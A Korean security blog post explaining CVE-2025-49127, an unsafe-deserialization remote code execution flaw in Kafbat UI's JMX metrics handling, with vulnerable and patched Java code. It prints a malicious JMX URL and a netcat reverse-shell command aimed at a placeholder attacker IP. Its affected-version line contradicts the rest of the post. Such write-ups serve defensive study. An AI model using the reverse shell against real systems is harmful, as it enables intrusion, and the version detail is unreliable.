---
title: "[하루한줄] CVE-2025-49127  : Kafbat UI의 Unsafe Deserialization로 인한 Remote Code Execution"
author: romi0x
tags: [Kafbat, Kafbat UI, Unsafe Deserialization, RCE, romi0x]
categories: [1day1line]
date: 2025-08-20 17:00:00
cc: true
index_img: /img/1day1line.png
---

## URL

- https://blog.securelayer7.net/cve-2025-49127-kafbat-ui-rce-vulnerability/

- https://github.com/kafbat/kafka-ui/security/advisories/GHSA-g3mf-c374-fgh2

## Target

- **Target Product**: Kafbat UI 1.0.0
- **Affected Versions**: 1.1.0 이상

## Explain
CVE-2025-49127로 영향받는 제품인 **[Kafbat UI](https://github.com/kafbat/kafka-ui)는 Apache Kafka 클러스터 관리를 위한 웹 기반 대시보드**입니다.

직관적인 인터페이스를 통해 Kafka 환경을 모니터링하고 관리할 수 있도록 지원하며, 주로 대규모 데이터 스트리밍 환경(금융, IoT, 로그 수집, 빅데이터 분석 등)에서 사용됩니다. 클러스터 관리, 토픽 관리, 컨슈머 그룹 추적 등 다양한 기능을 제공하지만, 이번 취약점은 **동적 클러스터 설정(Dynamic Cluster Configuration) 기능**에서 발생했습니다.

### **취약점 발생 메커니즘**

취약점은 **클러스터의 Metrics 설정에서 type을 JMX로 지정**했을 때 발생합니다.

#### 1. 악성 Kafka 브로커 구성

   공격자는 악성 Kafka 브로커를 구성하고, 이 브로커의 `advertised.listeners` 값을 조작하여 자신이 제어하는 JMX RMI 엔드포인트를 등록할 수 있습니다.

   여기서 `advertised.listeners`는 Kafka 브로커가 클라이언트(예: Kafbat UI, 프로듀서/컨슈머)에게 “접속할 때 이 주소로 접속하라” 라고 안내하는 설정입니다.

   공격자는 이 값을 악성 JMX 주소로 지정할 수 있는겁니다.


    service:jmx:rmi:///jndi/rmi://<공격자_IP>:<포트>/jmxrmi
    

   그럼, 관리자는 새로운 클러스터를 Kafbat UI에 등록하면서 공격자가 지정한 JVM 서버로 자동으로 연결됩니다.



#### 2. 직렬화된 객체 교환
   
   JMX는 내부적으로 Java RMI(Remote Method Invocation) 프로토콜을 사용하며, 이 과정에서 직렬화된 객체(Serialized Object)를 교환합니다. 
   
   공격자가 조작한 JMX 서버는 CommonsCollections 등의 가젯 체인(Gadget Chain)이 포함된 악성 직렬화 페이로드를 반환합니다.



#### 3. 역직렬화 → 원격 코드 실행

   Kafbat UI는 이 객체를 신뢰하고 역직렬화하면서, 공격자가 심어둔 명령을 실행하게 됩니다


    Runtime.getRuntime().exec("nc <공격자_IP> 9094 -e sh");

   결과적으로, 공격자는 Kafbat UI 서버의 프로세스 권한으로 명령을 실행할 수 있게 됩니다.
   
   
### 취약 코드

다음 코드는 Kafbat UI 1.0의 `JmxMetricsRetriever.java` 일부입니다.

```
@SneakyThrows
private List<RawMetric> retrieveSync(KafkaCluster c, Node node) {
    String jmxUrl = "service:jmx:rmi:///jndi/rmi://"
        + node.host() + ":" 
        + c.getMetricsConfig().getPort() 
        + "/jmxrmi";

    withJmxConnector(jmxUrl, c, jmxConnector -> getMetricsFromJmx(jmxConnector, result));
    return result;
}

```

이 코드의 문제는 `node.host()`와 `metricsConfig.port` 값이 외부에서 입력된 값에 의해 그대로 제어될 수 있다는 점입니다. 또한, 이 값들에 대해 별도의 URL 검증이나 필터링 과정이 없습니다.

결국 `JMXConnectorFactory.newJMXConnector`가 호출될 때, 공격자가 의도적으로 조작한 JMX 서버 주소로 연결을 시도하게 되고, 그 과정에서 반환되는 직렬화 객체를 아무런 검증 없이 역직렬화하게 됩니다. 이 때문에 공격자가 만든 악성 페이로드가 그대로 실행되며 RCE로 이어지는 것입니다.

### 패치 코드

패치된 코드를 보면 **JMX 엔드포인트 검증이 추가**됐습니다.

```
if (!isSafeJmxEndpoint(node.host(), c.getMetricsConfig().getPort())) {
    throw new ValidationException("Invalid JMX endpoint");
}

try (JMXConnector connector = 
        JMXConnectorFactory.newJMXConnector(new JMXServiceURL(jmxUrl), env)) {
    connector.connect(env);
    consumer.accept(connector);
}

```

또한 기본 설정에서 `DYNAMIC_CONFIG_ENABLED=false` 가 적용되도록 변경하여, 별도 설정 없이는 동적 클러스터 추가가 불가능하도록 변경됐습니다.

## Reference

https://github.com/kafbat/kafka-ui/releases/tag/v1.1.0